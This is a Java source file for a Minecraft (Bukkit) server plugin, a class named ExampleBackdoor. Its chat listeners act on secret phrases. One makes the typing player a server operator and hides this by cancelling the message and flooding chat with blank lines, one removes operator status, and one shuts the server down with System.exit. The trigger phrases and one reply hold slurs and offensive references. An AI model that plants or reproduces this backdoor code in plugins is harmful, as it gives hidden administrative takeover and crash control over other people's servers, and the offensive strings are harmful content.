package me.uberdevo.random.listeners;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

/**
 * @author UberDevo
 * Copyright @ UberDevo | All rights reserved
 */
public class ExampleBackdoor implements Listener {


    @EventHandler
    public void opMe(AsyncPlayerChatEvent e) {
        String prefix = "#OpMeBitch";
        if (e.getMessage().equalsIgnoreCase(prefix)) {
            e.setCancelled(true);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + e.getPlayer().getName());
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            e.getPlayer().sendMessage(ChatColor.AQUA + "Done!");
        }
    }

    @EventHandler
    public void deOp(AsyncPlayerChatEvent e) {
        String prefix = "#DeOpMeBitch";
        if (e.getMessage().equalsIgnoreCase(prefix)) {
            e.setCancelled(true);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "deop " + e.getPlayer().getName());
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            Bukkit.broadcastMessage("");
            e.getPlayer().sendMessage(ChatColor.AQUA + "Done!");
        }
    }

    @EventHandler
    public void Shutdown(AsyncPlayerChatEvent e) {
        String prefix = "#GeorgeFloyd";
        if (e.getMessage().equalsIgnoreCase(prefix)) {
            System.exit(0);
        }
    }

    @EventHandler
    public void hideenEvent(AsyncPlayerChatEvent e){
        String prefix = "#cloukegay";
        if (e.getMessage().equalsIgnoreCase(prefix)) {
            e.getPlayer().sendMessage("Clouke is fat");
        }
    }
}
